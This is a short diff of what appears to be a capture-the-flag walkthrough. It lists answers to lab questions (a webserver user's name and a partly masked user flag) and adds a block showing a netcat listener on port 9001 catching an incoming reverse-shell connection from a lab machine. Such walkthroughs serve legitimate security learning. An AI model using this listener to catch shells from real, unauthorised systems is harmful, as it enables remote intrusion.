@@ -124,6 +124,8 @@ What is the name of the user who manages the webserver? bill
 What is the user flag? 8bd7992fbe8a6a----------04cfcedb
 
 ```
+
+```
 nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [10.9.239.22] from (UNKNOWN) [10.10.123.163] 46752
